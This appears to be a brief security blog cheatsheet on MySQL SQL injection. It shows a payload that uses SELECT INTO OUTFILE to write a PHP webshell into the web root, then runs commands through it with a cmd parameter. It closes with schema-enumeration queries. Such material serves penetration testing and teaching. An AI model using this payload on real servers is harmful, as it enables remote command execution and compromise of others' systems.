---
layout: post
title: "SQLi: MySQL"
date: 2023-06-19
categories:
  - CHEATSHEET
tags:
  - SQLi
---

In an SQL injection scenario using `SELECT INTO OUTFILE`, an attacker might exploit the vulnerability to upload a webshell onto the server.  


### Example Scenario:

Imagine a website feature that allows users to export transaction details to a CSV file using a user-input controlled query, similar to the following:

```sql
SELECT transaction_details FROM transactions WHERE user_id = 'user_input';
```

An attacker could manipulate the `user_input` to end the initial query and append a malicious `SELECT INTO OUTFILE` command to upload a webshell:

```sql
1'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

#### Breakdown of the Injection:

1. **Termination of Original Query**: The attacker terminates the intended SQL query by injecting `1';` which effectively closes the user input for `user_id`.
2. **Webshell Payload**: The attacker starts a new query with `SELECT`, where the content to be selected is a PHP script: `<?php system($_GET["cmd"]); ?>`. This PHP script is a simple webshell that executes commands passed to it via the `cmd` GET parameter.
3. **File Creation**: The payload is written into a new file named `shell.php` in the `/var/www/html/` directory, which is typically accessible via the web browser.

#### Result of the Exploit:

If the server permissions allow writing files in the web directory and the application is vulnerable to SQL injection, this will create a file named `shell.php`. An attacker can then access this file via a web browser and execute server commands by appending a `cmd` parameter to the URL:

```shell
http://example.com/shell.php?cmd=whoami
```


<br><br>
> ***MySQL schema tips:***
> 
> ```sql
>    SHOW DATABASES;
>    
>    SELECT DATABASE();
>
>    SHOW TABLES;
> ```



 

